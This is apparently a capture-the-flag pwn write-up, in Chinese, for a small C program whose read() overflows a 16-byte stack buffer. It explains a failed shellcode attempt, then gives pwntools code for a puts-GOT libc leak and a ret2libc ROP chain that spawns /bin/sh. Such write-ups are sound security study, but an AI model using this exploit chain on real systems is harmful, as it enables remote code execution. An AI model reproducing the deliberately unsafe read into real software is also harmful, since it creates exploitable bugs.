### source code 
```c=
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char msg[] = "What is your favorite color? ";

void __attribute__ ((noinline)) ask(){
    puts(msg);

    char color[16];
    read(STDIN_FILENO, color, sizeof(color) * 16);

    if(strcmp(color, "yellow") == 0){
        puts("I also love yellow color");
    }else{
        puts("I don't like this color");
    }
}

int main(int argc, char *argv[]){
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    
    ask();
    
    return 0;
}

```

### **沒有開啟 canary 以及只有 partial RelRO，但有開 NX**

read 可以明顯發現有 bof 的問題，因為沒開 canary, 又有開 NX, 所以往 ROP 走

### 想法
#### solution 1:
1. 可以看到 msg 在 .bss 段, 利用 ROP 用 read 將他改成 shellcode
2. ret 2 msg 執行 shellcode
3. read:
a. rsi = buffer_addr
b. rdx = read size
c. rdi = file_descriptor
5. ***失敗***, 因為找不到 pop rdx 的 gadget, 無法指定 read_size

#### solution 2:
1. 利用 puts leak 出 server 端的 libc 版本
```python=
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_got = elf.got['read']
gad1 = 0x00000000004012c3 # pop rdi ; ret
main = 0x4011f8

# first payload
p.recvuntil(b'color?')
payload = b'a'*24 + p64(gad1) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)
p.recvuntil(b'color\n')
puts = u64(p.recv(6).ljust(8, b"\x00"))
```
大概就是 puts(*puts@got.plt) 的概念, 找出 puts 跟 read 的真實 address 後丟進 [libc database](https://libc.blukat.me/) 尋找 libc 版本
以 server 端為例, puts = 0x7b119fed75a0, read = 0x7c2484665130, 拿後 3bits 去查

<img width="1196" height="635" alt="image" src="https://github.com/user-attachments/assets/cd9dc6de-a51c-4269-ada4-74e719260dd9" />

就能知道 server 的 libc 版本以及 system 和 /bin/sh 對應的 offset

2. 有了 system 跟 /bin/sh 的位置之後, 就能 ROP ret2libc 了
```python=
ret = 0x000000000040101a # ret (for alignment)

# server
system = puts - 0x32190
binsh = puts + 0x13000a

print(f"puts: {hex(puts)}\nsystem: {hex(system)}\nbinsh: {hex(binsh)}\n")

''' second payload '''
payload = b'a'*24 + p64(gad1) + p64(binsh) + p64(ret) + p64(system) + p64(main)
p.sendline(payload)
```
